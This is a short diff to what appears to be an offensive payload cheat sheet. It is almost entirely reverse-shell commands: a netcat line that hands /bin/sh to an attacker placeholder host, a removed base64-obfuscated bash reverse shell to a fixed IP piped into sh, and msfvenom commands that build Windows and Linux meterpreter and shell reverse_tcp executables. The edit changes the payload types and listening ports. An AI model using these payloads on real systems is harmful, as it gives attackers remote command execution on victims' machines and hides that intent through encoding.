@@ -13,18 +13,16 @@ nc -e /bin/sh {ATTACKER_IP} {LPORT}
 {ENC_CALLBACK_BASH}
 
 
-printf '%s' 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxMS80NDMgMD4mMQ==' | base64 --decode | sh"
-
 
 
 
 
 #MSFVenom Payloads
 
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f exe -o pay64.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f exe -o pay86.exe
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f elf -o pay64.elf
-msfvenom -p linux/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f elf -o pay86.elf
+msfvenom -p windows/x64/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT=82 EXITFUNC=thread -f exe -o pay64.exe
+msfvenom -p windows/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT=84 EXITFUNC=thread -f exe -o pay86.exe
+msfvenom -p linux/x64/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT=82 EXITFUNC=thread -f elf -o pay64.elf
+msfvenom -p linux/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT=84 EXITFUNC=thread -f elf -o pay86.elf
 
 
 
